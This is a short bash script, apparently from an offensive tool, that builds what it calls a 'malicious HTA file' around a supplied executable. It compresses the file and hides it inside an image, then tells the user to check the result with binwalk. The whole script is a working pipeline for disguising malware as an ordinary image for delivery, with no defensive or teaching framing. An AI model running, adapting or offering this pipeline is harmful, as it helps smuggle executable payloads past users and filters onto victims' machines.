#!/bin/bash

# Complete payload creation script.
# Requirements: gcc, zlib-flate
# zlib-flate is part of the qpdf package, try apt-get install qpdf or pacman -S qpdf
# Arguments:
# 1: Path to be hidden 
# 2: Path to executable file

image=$1
executable=$2

# Compile payload creator
gcc payload_creator/hide_payload.c \
    -Wall -Wextra -Wpedantic \
    -Wformat=2 -Wno-unused-parameter -Wshadow \
    -Wwrite-strings -Wstrict-prototypes -Wold-style-definition \
    -Wredundant-decls -Wnested-externs -Wmissing-include-dirs \
    -Wjump-misses-init -Wlogical-op \
    -O2 \
    -o payload_creator/hide_payload
        
gcc payload_creator/generate_payload_array.c \
    -Wall -Wextra -Wpedantic \
    -Wformat=2 -Wno-unused-parameter -Wshadow \
    -Wwrite-strings -Wstrict-prototypes -Wold-style-definition \
    -Wredundant-decls -Wnested-externs -Wmissing-include-dirs \
    -Wjump-misses-init -Wlogical-op \
    -O2 \
    -o payload_creator/generate_payload_array

mkdir _tmp

# Create malicious HTA file
cat payload_loader/create_script_utils/header.html > _tmp/index.hta
./payload_creator/generate_payload_array $executable >> _tmp/index.hta
cat payload_loader/create_script_utils/footer.html >> _tmp/index.hta

zlib-flate -compress < _tmp/index.hta > _tmp/index.zip

# Hide payload in provided image
./payload_creator/hide_payload $image _tmp/index.zip
echo "Successfully hid your payload in the provided image, check with binwalk"

rm -rf _tmp
